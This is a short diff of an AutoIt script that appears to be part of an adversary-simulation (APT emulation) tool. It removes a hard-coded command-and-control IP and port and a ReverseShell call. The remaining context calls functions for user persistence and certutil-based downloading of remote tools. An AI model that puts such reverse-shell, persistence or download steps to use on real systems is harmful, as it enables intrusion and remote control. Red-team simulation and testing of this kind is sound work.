@@ -1,8 +1,5 @@
 #include <APT-SimulActor.au3>
 
-$c2_ip = "192.168.231.106"
-$c2_port = "444"
-
 init()
 
 if InternetCheck() Then
@@ -14,8 +11,6 @@ if InternetCheck() Then
 		 SetPersistent4CurrentUser()
 
 		 CertUtilDownloader($PSTools_URL)
-
-		 ReverseShell($c2_ip, $c2_port)
 
 	  Else
 
